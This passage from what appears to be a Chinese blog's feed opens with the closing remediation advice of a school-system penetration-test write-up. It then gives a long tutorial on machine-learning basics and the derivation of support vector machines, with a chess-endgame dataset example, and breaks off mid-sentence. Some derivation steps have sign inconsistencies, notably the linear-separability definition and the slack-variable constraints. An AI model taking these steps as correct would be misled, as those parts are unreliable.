class="headerlink" title="Advice"></a>Advice</h1><ol><li><strong>修改后端代码，如果 ID 不存在，返回 404 界面；</strong></li><li><strong>关闭 10789 端口的服务，或者修改 phpMyAdmin 页面文件名，避免被扫目录。</strong></li></ol><h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><p>已联系开发，且漏洞已修复。</p><p><img src="/pics/记一次对学校请假系统的渗透测试/7.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;****************************。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pentest" scheme="blog.b3ale.cn/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>Machine Learning &amp; SVM</title>
    <link href="blog.b3ale.cn/2020/07/09/Machine-Learning-SVM/"/>
    <id>blog.b3ale.cn/2020/07/09/Machine-Learning-SVM/</id>
    <published>2020-07-09T04:53:38.000Z</published>
    <updated>2020-07-16T03:34:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>机器学习入门。</p><a id="more"></a><h1 id="What-is-Machine-Learning"><a href="#What-is-Machine-Learning" class="headerlink" title="What is Machine Learning"></a>What is Machine Learning</h1><p>机器学习致力于研究通过计算的手段，利用经验来改善系统自身的性能。在计算机系统中，<strong>经验</strong>通常以<strong>数据</strong>形式存在，而机器学习所研究的主要内容，是关于在计算机上从数据中产生<strong>模型</strong>（Model）的算法，即<strong>学习算法</strong>（Learning Algorithm）。有了学习算法，把经验数据提供给它，它就能基于这些数据产生模型；在面对新的情况时，模型会给我们提供相应的判断。如果说计算机科学是研究关于<strong>算法</strong>的学问，那么机器学习就是研究关于<strong>学习算法</strong>的学问。</p><h2 id="Data-Set"><a href="#Data-Set" class="headerlink" title="Data Set"></a>Data Set</h2><p>假定我们收集了一批关于西瓜的数据，例如 <code>(色泽=青绿, 根蒂=蜷缩, 敲声=浊响), (色泽=乌黑, 根蒂=稍蜷, 敲声=沉闷), (色泽=浅白, 根蒂=硬挺, 敲声=清脆)……</code>，这组记录的集合被称作一个数据集（Data Set），其中每条记录是关于一个事件或对象的描述，称为一个<strong>示例</strong>（Instance）或<strong>样本</strong>（Sample）。反映事件或对象在某方面的表现或性质的事项，例如<strong>色泽</strong>、<strong>根蒂</strong>、<strong>敲声</strong>，称为<strong>属性</strong>（Attribute）或<strong>特征</strong>（Feature）；属性上的取值，例如<strong>青绿</strong>、<strong>乌黑</strong>，称为<strong>属性值</strong>（Attribute Value）。属性张成的空间称为<strong>属性空间</strong>（Attribute Space）、<strong>样本空间</strong>（Sample Space）或<strong>输入空间</strong>。如果将<strong>色泽</strong>、<strong>根蒂</strong>、<strong>敲声</strong>作为三个坐标轴，则它们张成一个用于描述西瓜的三维空间，每个西瓜都可在这个空间中找到自己的坐标位置。由于空间中的每个点对应一个坐标向量，因此我们也把一个示例称为一个<strong>特征向量</strong>（Feature Vector）。</p><p>一般地，令 $D=\{x_1,x_2,\cdots,x_m\}$ 表示包含 $m$ 个示例的数据集，每个示例由 $d$ 个属性描述，则每个示例 $x_i=(x_{i1};x_{i2};\cdots;x_{id})$ 是 $d$ 维空间 $\chi$ 中的一个向量，$x_i\in\chi$，其中 $x_{ij}$ 是 $x_i$ 在第 $j$ 个属性上的取值，$d$ 称为样本 $x_i$ 的<strong>维数</strong>（Dimensionality）。</p><h2 id="Training"><a href="#Training" class="headerlink" title="Training"></a>Training</h2><p>从数据中学得模型的过程称为<strong>学习</strong>（Learning）或<strong>训练</strong>（Training），这个过程通过执行某个学习算法来完成。训练过程中使用的数据称为<strong>训练数据</strong>（training data），其中每个样本称为一个<strong>训练样本</strong>（Training Sample），训练样本组成的集合称为<strong>训练集</strong>（Training Set）。学得模型对应了关于数的某种潜在的规律，因此亦称<strong>假设</strong>（Hypothesis）；这种潜在规律自身，则称为<strong>真相</strong>或<strong>真实</strong>（Ground-truth），学习过程就是为了找出或逼近真相。</p><p>如果希望学得一个能帮助判断的模型，仅有前面的示例数据是不够的。建立这样的关于<strong>预测</strong>（Prediction）的模型，我们需获得训练样本的<strong>结果</strong>信息，例如 <code>((色泽=青绿, 根蒂=蜷缩, 敲声=浊响), 好瓜)</code>。这里关于示例结果的信息，例如<strong>好瓜</strong>，称为<strong>标记</strong>（Label）；拥有了标记信息的示例，则称为<strong>样例</strong>（Example）。一般地，用 $(x_i, y_i)$ 表示第 $i$ 个样例，其中 $y_i\in\upsilon$ 是示例 $x_i$ 的标记，$\upsilon$ 是所有标记的集合，亦称<strong>标记空间</strong>（Label Space）或<strong>输出空间</strong>。</p><p>若欲预测的是离散值，例如<strong>好瓜</strong>或<strong>坏瓜</strong>，此类学习任务称为<strong>分类</strong>（Classification）；若欲预测的是连续值，例如西瓜成熟度，此类学习任务称为<strong>回归</strong>（Regression）。对只涉及两个类别的<strong>二分类</strong>（Binary Classification）任务，通常称其中一个类为<strong>正类</strong>（Positive Class），另一个类为<strong>反类</strong>（Negative Class）；涉及多个类别时，则称为<strong>多分类</strong>（Multi-class Classification）任务。一般地，预测任务是希望通过对训练集 $\{(x_1,y_1),(x_2,y_2),\cdots,(x_m,y_m)\}$ 进行学习，建立一个从输入空间 $\chi$ 到输出空间 $\upsilon$ 的映射 $f:\chi\mapsto\upsilon$。对二分类任务，通常令 $\upsilon = \{-1,+1\}$ 或 $\{0,1\}$；对多分类任务，$\vert\upsilon\vert&gt;2$；对回归任务，$\upsilon=\mathbb{R}$，$\mathbb{R}$ 为实数集。</p><h2 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h2><p>学得模型后，使用其进行预测的过程称为<strong>测试</strong>（Testing），被预测的样本称为<strong>测试样本</strong>（Testing Sample）。例如在学得 $f$ 后，对测试例 $x$，可得到其预测标记 $y=f(x)$。还可以做<strong>聚类</strong>（Clustering），即将训练集中的数据分成若干组，每组称为一个<strong>簇</strong>（Cluster）；这些自动形成的簇可能对应一些潜在的概念划分，有助于我们了解数据内在的规律，能为更深入地分析数据建立基础。</p><p>根据训练数据是否拥有标记信息，学习任务可大致划分为两大类<strong>监督学习</strong>（Supervised Learning）和<strong>无监督学习</strong>（Unsupervised Learning），分类和回归是前者的代表，而聚类则是后者的代表。</p><p>机器学习的目标是使学得的模型能很好地适用于<strong>新样本</strong>，而不是仅仅在训练样本上工作得很好；即便对聚类这样的无监督学习任务，也希望学得的簇划分能适用于没在训练集中出现的样本。学得模型适用于新样本的能力，称为<strong>泛化</strong>（Generalization）能力。具有强泛化能力的模型能很好地适用于整个样本空间。尽管训练集通常只是样本需间的一个很小的采样，我们仍希望它能很好地反映出样本空间的特性，否则就很难期望在训练集上学得的模型能在整个样本空间上都工作得很好。通常假设样本空间中全体样本服从一个未知<strong>分布</strong>（Distribution）$D$，我们获得的每个样本都是独立地从这个分布上采样获得的，即<strong>独立同分布</strong>（Independent and Identically Distributed，简称 I.I.D.）。一般而言，训练样本越多，我们得到的关于 $D$ 的信息越多，这样就越有可能通过学习获得具有强泛化能力的模型。</p><h2 id="No-Free-Lunch-Theorem"><a href="#No-Free-Lunch-Theorem" class="headerlink" title="No Free Lunch Theorem"></a>No Free Lunch Theorem</h2><p>如果我们不对特征空间有先验假设，则所有算法的平均表现是一样的。</p><p>假设有两种算法 $Z_a$ 和 $Z_b$，分别对样本进行测试。得到的结果是不确定的，可能 $Z_a$ 的泛化能力更强，当然也有可能 $Z_b$ 的泛化能力更强。</p><p><img src="/pics/Machine-Learning-SVM/1.png" srcset="/img/loading.gif" alt></p><p>假设样本空间 $\chi$ 和假设空间 $\eta$ 都是离散的。令 $P(h|X, Z_a)$ 代表算法 $Z_a$ 基于训练数据 $X$ 产生假设 $h$ 的概率，再令 $f$ 代表我们希望学习的真实目标函数。$Z_A$ 的<strong>训练集外误差</strong>，即 $Z_a$ 在训练集之外的所有样本上的误差为：</p><p>$$<br>E_{ote}(Z_A|X,f)=\sum_h\sum_{x\in\chi-X}P(x) {II}(h(x)\not ={f(x)}) P(h|X,Z_a)<br>$$</p><p>其中 $II(\cdot)$ 是指示函数，若 $\cdot$ 为真则取值 $1$，否则取 $0$。这里考虑二分类问题，且真实目标函数可以是任何函数 $\chi\mapsto\{0,1\}$，函数空间为 $\{0,1\}^{|\chi|}$. 对所有可能的 $f$ 按均匀分布对误差求和，有：</p><p>$$<br>\begin{array}{cc}<br>\sum_fE_{ote}(Z_a|X,f)=\sum_f\sum_h\sum_{x\in\chi-X}P(x) {II}(h(x)\not ={f(x)}) P(h|X,Z_a)\\ =\sum_{x\in\chi-X}P(x)\sum_hP(h|X,Z_a)\sum_fII(h(x)\not ={f(x)})\\ =\sum_{x\in\chi-X}P(x)\sum_hP(h|X,Z_a)\frac{1}{2}2^{|\chi|}\\ =\frac{1}{2}2^{|\chi|}\sum_{x\in\chi-X}P(x)\sum_hP(h|X,Z_a)\\ =\frac{1}{2}2^{|\chi|}\sum_{x\in\chi-X}P(x)\cdot1<br>\end{array}<br>$$</p><p>可以看到，上面得出的总误差和学习算法无关，也就是说，不管算法 $Z_a$ 有多聪明，算法 $Z_b$ 有多笨拙，两者期望是相同的。</p><blockquote><p>不过一般认为特征差距小的样本更有可能是同一类。</p></blockquote><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>机器学习主要分为以下几个步骤：</p><ul><li>获取训练集；</li><li>从训练集中提取特征；</li><li>使用学习算法进行训练；</li><li>对样本集进行测试。</li></ul><h1 id="Support-Vector-Machine"><a href="#Support-Vector-Machine" class="headerlink" title="Support Vector Machine"></a>Support Vector Machine</h1><p>支持向量机（Vapnik 发明）是一种最大化间隔（Margin）的分类算法。</p><h2 id="Linear-Model-Linear-Separable"><a href="#Linear-Model-Linear-Separable" class="headerlink" title="Linear Model - Linear Separable"></a>Linear Model - Linear Separable</h2><p>定义：</p><ol><li>训练数据及标记：$\{(x_1,y_1),(x_2,y_2),\cdots,(x_N,y_N)\}$，其中 $x$ 为一个向量，$y$ 为一个标记。例如上面提到的 <code>((色泽=青绿, 根蒂=蜷缩, 敲声=浊响), 好瓜)</code>；</li><li>线性模型：$(\omega, b)$，其中 $\omega$ 为一个向量（和 $x$ 的维度相同），$b$ 是一个常数。有超平面（Hyperplane）对应的方程 $\omega_1x_1+\omega_2x_2+\cdots+\omega_Nx_N+b=0$，一般写成 $\omega^Tx+b=0$，该超平面将输入空间分成了两个部分，其中超平面的法向量 $\omega=\begin{bmatrix}\omega_1\\ \omega_2\\ \vdots\\ \omega_N\end{bmatrix}$。当学得 $\omega$ 和 $b$ 后，模型就可以确定了；</li><li>一个训练集（$\{(x_i, y_i)\}_{i=1\sim N}$）线性可分是指存在 $(\omega, b)$，对任意 $i=1 \sim N$ 有：<ol><li>若 $y_i=+1$，则 $\omega^Tx_i+b≤0$；</li><li>若 $y_i=-1$，则 $\omega^Tx_i+b&gt;0$；</li><li>总结为 $y_i[\omega^Tx_i+b]≥0$。</li></ol></li></ol><p><img src="/pics/Machine-Learning-SVM/2.png" srcset="/img/loading.gif" alt></p><p>其中使等号成立的点被称为<strong>支持向量</strong>（Support Vector），两个异类支持向量到超平面的距离称为<strong>间隔</strong>（Margin）。以下为支持向量机的基本型，即将原本的求最大间隔转换成了一个带有限制条件的最小化问题。同时这里的最小化也是一个优化问题（凸优化问题中的二次规划问题，即目标函数为二次项，而限制条件为一次项，其结果要么无解，要么只有一个极值）：</p><ul><li>最小化（Minimize）：$\frac{1}{2}\lVert\omega\rVert^2$；</li><li>限制条件（Subject to）：$y_i[\omega^Tx_i+b]≥1(i=1\sim N)$。</li></ul><p>证明：</p><ul><li>事实 1：$\omega^Tx+b=0$ 与 $a\omega^Tx+ab=0$ 是同一个平面（$a\in \mathbb{R}^+$），两者满足同一公式；</li><li>事实 2：点到平面的距离公式。<ul><li>有平面 $\omega_1x+\omega_2y+b=0$，则点 $(x_0, y_0)$ 到此平面的距离 $d$ 为 $\frac{|\omega_1x_0+\omega_2y_0+b|}{\sqrt{\omega_1^2+\omega_2^2}}$；</li><li>有超平面 $\omega^Tx+b=0$，则向量 $x_0$ 到此超平面的距离 $d$ 为 $\frac{\omega^Tx_0+b}{\sqrt{\omega_1^2+\omega_2^2+\cdots+\omega_m^2}}$，即 $\frac{\omega^Tx_0+b}{\lVert\omega\rVert}$。</li></ul></li><li>可以用 $a$ 去缩放，使得 $(\omega, b)$ 变为 $(a\omega, ab)$，最终使在支持向量 $x_0$ 上有：$|\omega^Tx_0+b|=1$，此时支持向量与平面的距离为 $d=\frac{1}{\lVert\omega\rVert}$。那么最小化 $\lVert\omega\rVert$ 就可以达到最大化间隔 $d$ 的作用（二次方和参数 $\frac{1}{2}$ 主要用于后面的求导，对求最小化没有影响）。</li></ul><h2 id="Non-linear-Model-Non-linear-Separable"><a href="#Non-linear-Model-Non-linear-Separable" class="headerlink" title="Non-linear Model - Non-linear Separable"></a>Non-linear Model - Non-linear Separable</h2><p>对线性模型进行改造：</p><ul><li>最小化：$\frac{1}{2}\lVert\omega\rVert^2+C\sum_{i=1}^N\xi_i$，$\xi$ 为松弛变量（Slack Variable），$C\sum_{i=1}^N\xi_i$ 为正则项（Regulation Term），$C$ 为事先设定好的参数；</li><li>限制条件；<ul><li>$y_i[\omega^Tx_i+b]≥1-\xi(i=1\sim N)$；</li><li>$\xi≥0$。</li></ul></li><li>高维映射 $\phi(x)$，即 $x\mapsto^\phi\phi(x)$，$x$ 是一个低维的矢量，$\phi(x)$ 是一个高维的矢量。<ul><li>在高维空间下被线性分割的概率更大，故可以将原限制条件中的 $x$ 替换为 $\phi(x)$，同时 $\omega$ 也变为一个和 $\phi(x)$ 相同维度的向量；</li><li>例：有如下高维映射 $x=\begin{bmatrix}a\\ b\end{bmatrix}\mapsto^\phi\phi(x)=\begin{bmatrix}a^2\\ b^2\\ a\\ b\\ ab\end{bmatrix}$</li><li>给出异或问题如下：$x_1=\begin{bmatrix}0\\ 0\end{bmatrix}\in C_1$、$x_2=\begin{bmatrix}1\\ 1\end{bmatrix}\in C_1$、$x_3=\begin{bmatrix}1\\ 0\end{bmatrix}\in C_2$、$x_4=\begin{bmatrix}0\\ 1\end{bmatrix}\in C_2$；</li><li>经过上面的高维映射后，得到 $\phi(x_1)=\begin{bmatrix}0\\ 0\\ 0\\ 0\\ 0\end{bmatrix}$、$\phi(x_2)=\begin{bmatrix}1\\ 1\\ 1\\ 1\\ 1\end{bmatrix}$、$\phi(x_3)=\begin{bmatrix}1\\ 0\\ 1\\ 0\\ 0\end{bmatrix}$、$\phi(x_4)=\begin{bmatrix}0\\ 1\\ 0\\ 1\\ 0\end{bmatrix}$；</li><li>可求出一组 $\omega=\begin{bmatrix}-1\\ -1\\ -1\\ -1\\ 6\end{bmatrix}, b=1$，使得 $\begin{cases}\omega^T\phi(x_1)+b=1\in C_1\\ \omega^T\phi(x_2)+b=3\in C_1\\ \omega^T\phi(x_3)+b=-1\in C_2\\ \omega^T\phi(x_4)+b=-1\in C_2\end{cases}$。</li></ul></li></ul><p><img src="/pics/Machine-Learning-SVM/3.png" srcset="/img/loading.gif" alt></p><p><strong>SVM 中将 $\phi(x)$ 选择为无限维映射</strong>。而我们可以不知道无限维映射 $\phi(x)$ 的<em>显示</em>表达式，只需要知道一个核函数（Kernel Function）（$\phi(x_i)$ 和 $\phi(x_j)$ 两个无限维向量的内积）：</p><p>$$<br>K(x_i,x_j)=\phi(x_i)^T\phi(x_j)<br>$$</p><p>则无限维优化式仍然可解。</p><h3 id="核函数"><a href="#核函数" class="headerlink" title="核函数"></a>核函数</h3><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">表达式</th><th style="text-align:center">参数</th></tr></thead><tbody><tr><td style="text-align:center">线性核（Linear）</td><td style="text-align:center">$K(x_i,x_j)=x_i^Tx_j$</td><td style="text-align:center">-</td></tr><tr><td style="text-align:center">多项式核（Poly）</td><td style="text-align:center">$K(x_i,x_j)=(x_i^Tx_j)^d$</td><td style="text-align:center">$d≥1$ 为多项式的次数</td></tr><tr><td style="text-align:center">高斯径向基函数（RBF）</td><td style="text-align:center">$K(x_i,x_j)=e^{-\frac{\lVert x_i-x_j\rVert^2}{2\tau^2}}$</td><td style="text-align:center">$\tau&gt;0$ 为高斯核的带宽（Width）</td></tr><tr><td style="text-align:center">拉普拉斯核</td><td style="text-align:center">$K(x_i,x_j)=e^{-\frac{\lVert x_i-x_j\rVert}{\tau}}$</td><td style="text-align:center">$\tau&gt;0$</td></tr><tr><td style="text-align:center">Sigmoid 核</td><td style="text-align:center">$K(x_i,x_j)=\tanh(\beta x_i^Tx_j+\theta)$</td><td style="text-align:center">$\tanh$ 为双曲正切函数，$\beta&gt;0$，$\theta&lt;0$</td></tr></tbody></table><p>通过函数组合也可以得到核函数：</p><ul><li>若 $K_1$ 和 $K_2$ 是核函数，则对于任意正数 $\gamma_1$、$\gamma_2$，其线性组合 $\gamma_1K_1+\gamma_2K_2$ 也是核函数；</li><li>若 $K_1$ 和 $K_2$ 是核函数，则核函数的直积（笛卡尔积）$K_1\times K_2(x_i,x_j)=K_1(x_i,x_j)K_2(x_i,x_j)$ 也是核函数；</li><li>若 $K_1$ 是核函数，则对于任意函数 $g(x)$，$K(x_i,x_j)=g(x_i)K_1(x_i,x_j)g(x_j)$ 也是核函数。</li></ul><p>$K(x_i,x_j)$ 能够写成 $\phi(x_i)^T\phi(x_j)$ 的充要条件（Mercer’s Theorem）：</p><ol><li>交换性：$K(x_i,x_j)=K(x_j,x_i)$；</li><li>半正定性：对任意常数 $c_i$ 和向量 $x_i$（$i=1\sim N$），有 $\sum_{i=1}^N\sum_{j=1}^Nc_ic_jK(x_i,x_j)≥0$。</li></ol><h3 id="优化理论"><a href="#优化理论" class="headerlink" title="优化理论"></a>优化理论</h3><p>需要在只知道 $K$，不知道 $\phi$ 的情况下解出优化问题（Kernel Trick）。</p><h4 id="原问题（Prime-Problem）"><a href="#原问题（Prime-Problem）" class="headerlink" title="原问题（Prime Problem）"></a>原问题（Prime Problem）</h4><ul><li>最小化：$f(\omega)$；</li><li>限制条件：$g_i(\omega)≤0(i=1\sim K)$、$h_i(\omega)=0(i=1\sim M)$。</li></ul><h4 id="对偶问题（Dual-Problem）"><a href="#对偶问题（Dual-Problem）" class="headerlink" title="对偶问题（Dual Problem）"></a>对偶问题（Dual Problem）</h4><ul><li>定义函数：$\begin{array}{cc}L(\omega,\alpha,\beta)=f(\omega)+\sum_{i=1}^K\alpha_ig_i(\omega)+\sum_{i=1}^M\beta_ih_i(\omega)\\ =f(\omega)+\alpha^Tg(\omega)+\beta^Th(\omega)\end{array}$；</li><li>对偶问题定义。<ul><li>最大化：$\theta(\alpha,\beta)=\inf_{所有\omega}\{L(\omega,\alpha,\beta)\}$，其中 $\inf$ 是在确定 $\alpha$ 和 $\beta$ 的情况下遍历 $\omega$ 来计算最小值；</li><li>限制条件：$\alpha_i≥0(i=1\sim K)$。</li></ul></li></ul><h4 id="原问题和对偶问题之间的关系"><a href="#原问题和对偶问题之间的关系" class="headerlink" title="原问题和对偶问题之间的关系"></a>原问题和对偶问题之间的关系</h4><p>定理：如果 $\omega^*$ 是原问题的解，而 $\alpha^*$、$\beta^*$ 是对偶问题的解，则有：</p><p>$$<br>f(\omega^*)≥\theta(\alpha^*,\beta^*)<br>$$</p><p>证：</p><p>$$<br>\begin{array}{cc}<br>\theta(\alpha^*,\beta^*)=\inf\{L(\omega,\alpha^*,\beta^*)\}\\ ≤L(\omega^*,\alpha^*,\beta^*)\\ =f(\omega^*)+\sum_{i=1}^K\alpha_i^*g_i(\omega^*)+\sum_{i=1}^M\beta_i^*h_i(\omega^*)\\ ≤f(\omega^*)<br>\end{array}<br>$$</p><ul><li>定义：$G=f(\omega^*)-\theta(\alpha^*,\beta^*)≥0$，其中 $G$ 叫做原问题与对偶问题的间距（Duality Gap）；</li><li>对于某些特定的优化问题，可以证明 $G=0$；</li><li>强对偶定理：若 $f(\omega)$ 是凸函数，且 $g(\omega)=A\omega+b$，$h(\omega)=C\omega+d$，则此优化问题的原问题与对偶问题的间距为 0，即当 $\omega^*$ 是原问题的解，而 $\alpha^*$、$\beta^*$ 是对偶问题的解时，满足 $f(\omega^*)=\theta(\alpha^*,\beta^*)$；<ul><li>KKT 条件（Karush–Kuhn–Tucker Condition）：在强对偶定理的条件下，对于任意的 $i=1\sim K$，可以得到 $\alpha_i^*=0$ 或 $g_i^*(\omega^*)=0$。</li></ul></li></ul><h3 id="证明非线性模型"><a href="#证明非线性模型" class="headerlink" title="证明非线性模型"></a>证明非线性模型</h3><p>为了和原问题一一对应，将 SVM 做以下调整：</p><ul><li>最小化：$f(\omega)=\frac{1}{2}\lVert\omega\rVert^2-C\sum_{i=1}^N\xi_i$（凸函数）；<ul><li>凸函数定义：对任意 $\omega_1$、$\omega_2$、$\lambda\in[0,1]$，满足 $f(\lambda\omega_1+(1-\lambda)\omega_2)≤\lambda f(\omega_1)+(1-\lambda)f(\omega_2)$。</li></ul></li><li>限制条件；<ul><li>$1+\xi_i-y_i\omega^T\phi(x_i)+y_ib≤0$；</li><li>$\xi_i≤0$（$i=1\sim K$）。</li></ul></li></ul><p>接下来写出对应的对偶问题：</p><ul><li>最大化：$\begin{array}{cc}\theta(\alpha,\beta)=\\ \inf_{所有(\omega,\xi_i,b)}\{\frac{1}{2}\lVert\omega\rVert^2-C\sum_{i=1}^N\xi_i+\sum_{i=1}^N\beta_i\xi_i+\sum_{i=1}^N\alpha_i[1+\xi_i-y_i\omega^T\phi(x_i)-y_ib]\}\end{array}$；</li><li>限制条件（$i=1\sim N$）。<ul><li>$\alpha_i≥0$；</li><li>$\beta_i≥0$。</li></ul></li></ul><p>接下来将对偶问题中的最大化进行化简。首先计算 $\inf$ 对应的最小值，需要求三个自变量对应的偏导数：</p><p>$$<br>\begin{cases}<br>\frac{\partial L}{\partial\omega}=0\\<br>\frac{\partial L}{\partial\xi_i}=0\\<br>\frac{\partial L}{\partial b}=0<br>\end{cases}<br>$$</p><ul><li>其中对向量 $\omega=\begin{bmatrix}\omega_1\\ \omega_2\\ \vdots\\ \omega_m\end{bmatrix}$ 求 $f(\omega)$ 的偏导相当于对每一个分量求偏导，即 $\frac{\partial f}{\partial\omega}=\begin{bmatrix}\frac{\partial f}{\partial\omega_1}\\ \frac{\partial f}{\partial\omega_2}\\ \vdots\\ \frac{\partial f}{\partial\omega_m}\end{bmatrix}$；</li><li>若 $f(\omega)=\frac{1}{2}\lVert\omega\rVert^2$，则 $\frac{\partial f}{\partial\omega}=\omega$；</li><li>若 $f(\omega)=\omega^Tx$，则 $\frac{\partial f}{\partial\omega}=x$。</li></ul><p>求三个自变量的偏导数的结果如下：</p><p>$$<br>\begin{cases}<br>\frac{\partial L}{\partial\omega}=0 \mapsto \omega-\sum_{i=1}^N\alpha_iy_i\phi(x_i)=0\\<br>\frac{\partial L}{\partial\xi_i}=0 \mapsto -C+\beta_i+\alpha_i=0\\<br>\frac{\partial L}{\partial b}=0 \mapsto -\sum_{i=1}^N\alpha_iy_i=0<br>\end{cases}<br>$$</p><p>接着将求出的条件代入 $\theta(\alpha,\beta)$，将 $\frac{1}{2}\lVert\omega\rVert^2$ 化简，可以消去 $\phi(\cdot)$：</p><p>$$<br>\begin{array}{cc}<br>\frac{1}{2}\lVert\omega\rVert^2=\frac{1}{2}\omega^T\omega\\<br>=\frac{1}{2}(\sum_{i=1}^N\alpha_iy_i\phi(x_i))^T(\sum_{j=1}^N\alpha_jy_j\phi(x_j))\\<br>=\frac{1}{2}\sum_{i=1}^N\sum_{j=1}^N\alpha_i\alpha_jy_iy_j\phi(x_i)^T\phi(x_j)\\<br>=\frac{1}{2}\sum_{i=1}^N\sum_{j=1}^N\alpha_i\alpha_jy_iy_jK(x_i,x_j)<br>\end{array}<br>$$</p><p>同理可以把 $-\sum_{i=1}^N\alpha_iy_i\omega^T\phi(x_i)$ 化简，并消去 $\phi(\cdot)$：</p><p>$$<br>\begin{array}{cc}<br>-\sum_{i=1}^N\alpha_iy_i\omega^T\phi(x_i)=-\sum_{i=1}^N\alpha_iy_i(\sum_{j=1}^N\alpha_jy_j\phi(x_j))^T\phi(x_i)\\<br>=-\sum_{i=1}^N\sum_{j=1}^N\alpha_i\alpha_jy_iy_j\phi(x_j)^T\phi(x_i)\\<br>=-\sum_{i=1}^N\sum_{j=1}^N\alpha_i\alpha_jy_iy_jK(x_i,x_j)<br>\end{array}<br>$$</p><p>最后得到对偶问题的最终式：</p><ul><li>最大化：$\begin{array}{cc}\theta(\alpha)=\frac{1}{2}\lVert\omega\rVert^2+\sum_{i=1}^N\alpha_i[1-y_i\omega^T\phi(x_i)]\\ =\sum_{i=1}^N\alpha_i-\frac{1}{2}\sum_{i=1}\sum_{j=1}\alpha_i\alpha_jy_iy_jK(x_i,x_j)\end{array}$；<ul><li>SMO 算法可以解凸优化问题。</li></ul></li><li>限制条件。<ul><li>$0≤\alpha_i≤C$；</li><li>$\sum_{i=1}^N\alpha_iy_i=0$。</li></ul></li></ul><p>这里最终得到的是一个有关 $\alpha$ 的优化问题。由于测试时需要计算 $\omega^T\phi(x_i)+b$ 的值，所以这里仍然需要找到 $\omega^T\phi(x_i)+b$ 和 $\alpha$ 之间的关系。首先 $\omega$ 不需要计算，可以通过和前面类似的方法，使用核函数计算出 $\omega^T\phi(x_i)$ 的值：</p><p>$$<br>\begin{array}{cc}<br>\omega^Tx_i=(\sum_{j=1}^N\alpha_jy_j\phi(x_j))^T\phi(x_i)\\<br>=\sum_{j=1}^N\alpha_jy_j\phi(x_j)^T\phi(x_i)\\<br>=\sum_{j=1}^N\alpha_jy_jK(x_i,x_j)<br>\end{array}<br>$$</p><p>接下来是 $b$。因为这里的情况满足 KKT 条件，那么存在 $\alpha_i^*=0$ 或是 $g_i^*(\omega^*)=0$，对应满足的式子如下：</p><ul><li>要么 $\beta_i=0$；要么 $\xi_i=0$；</li><li>要么 $\alpha_i=0$；要么 $1+\xi_i-y_i\omega^T\phi(x_i)-y_ib=0$。</li></ul><p>首先取一个 $0&lt;\alpha_i&lt;C$，那么 $1+\xi_i-y_i\omega^T\phi(x_i)-y_ib=0$，同时可得出 $\beta_i=C-\alpha_i&gt;0$，即 $\beta_i≠0$ 且 $\xi_i=0$。经化简后，$b$ 的值为：</p><p>$$<br>\begin{array}{cc}<br>1-y_i\omega^T\phi(x_i)-y_ib=0\\<br>b=\frac{1-y_i\omega^T\phi(x_i)}{y_i}\\<br>b=\frac{1-y_i(\sum_{j=1}^N\alpha_jy_j\phi(x_j))^T\phi(x_i)}{y_i}\\<br>b=\frac{1-y_i\sum_{j=1}^N\alpha_jy_jK(x_i,x_j)}{y_i}<br>\end{array}<br>$$</p><h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><ol><li>训练流程；<ul><li>输入训练样本 $\{(x_i,y_i)\}_{i=1\sim N}$；</li><li>解优化问题。<ul><li>最大化：$\theta(\alpha)=\sum_{i=1}^N\alpha_i-\frac{1}{2}\sum_{i=1}\sum_{j=1}\alpha_i\alpha_jy_iy_jK(x_i,x_j)$；</li><li>限制条件。<ul><li>$0≤\alpha_i≤C$；</li><li>$\sum_{i=1}^N\alpha_iy_i=0$。</li></ul></li></ul></li><li>算 $b$，找一个 $0&lt;\alpha_i&lt;C$，得出 $b=\frac{1-y_i\sum_{j=1}^N\alpha_jy_jK(x_i,x_j)}{y_i}$。</li></ul></li><li>测试流程。<ul><li>输入测试样本 $X$。<ul><li>若 $\sum_{i=1}^N\alpha_iy_iK(x_i,x)+b≥0$，则 $y=+1$；</li><li>若 $\sum_{i=1}^N\alpha_iy_iK(x_i,x)+b&lt;0$，则 $y=-1$。</li></ul></li></ul></li></ol><h2 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a>Programming</h2><ul><li>兵王问题：黑方只剩一个王，白方剩一个兵一个王；</li><li>两种可能；<ul><li>白方将死黑方，获胜；</li><li>和棋。</li></ul></li><li>这两种可能视三个棋子在棋盘的位置而确定。</li></ul><p>有数据 <a href="https://archive.ics.uci.edu/ml/machine-learning-databases/chess/king-rook-vs-king/krkopt.data" target="_blank" rel="noopener">krkopt.data</a> 用于训练和测试。每行为一组数据集和标记，前 6 位是 3 个坐标，最后一个单词表示平局（draw）或是白棋在 x 步之后将死黑棋：</p><pre><code class="bash">$ wc krkopt.data   28056   28056  531806 krkopt.data$ cat ./krkopt.dataa,1,b,3,c,2,drawa,1,c,1,c,2,drawa,1,c,1,d,1,drawa,1,c,1,d,2,drawa,1,c,2,c,1,drawa,1,c,2,c,3,drawa,1,c,2,d,1,drawa,1,c,2,d,2,drawa,1,c,2,d,3,drawa,1,c,3,c,2,draw...c,3,e,6,e,1,ninec,3,e,6,f,1,ninec,3,e,6,g,1,ninec,3,e,6,h,2,ninec,3,e,6,h,7,ninec,3,e,7,e,1,ninec,3,e,7,f,1,ninec,3,e,7,g,1,ninec,3,e,7,h,2,ninec,3,e,8,e,1,ninec,3,e,8,f,1,nine...b,1,g,3,e,4,sixteenb,1,g,3,e,5,sixteenb,1,g,3,f,5,sixteenb,1,g,3,g,5,sixteenb,1,g,6,e,4,sixteenb,1,g,6,e,5,sixteenb,1,g,6,e,6,sixteenb,1,g,6,f,4,sixteenb,1,g,6,g,4,sixteenb,1,g,7,e,5,sixteenb,1,g,7,e,6,sixteen</code></pre><ul><li>总样本数 28056，其中正样本 2796，负样本 25260；</li><li>随机取 5000 个样本进行训练，其余用于测试；</li><li>样本归一化，在训练样本上，求出每个维度的均值和方差，在训练和测试样本上同时归一化：$newX=\frac{X-mean(X)}{std(X)}$，其中 $mean(X)$ 是 $X$ 的均值，$std(X)$ 是 $X$ 方差的二次根；</li><li>高斯核；</li><li>5-Fold Cross Validation，在 $CScale=[2^{-5}, 2^{15}]$、$\gamma 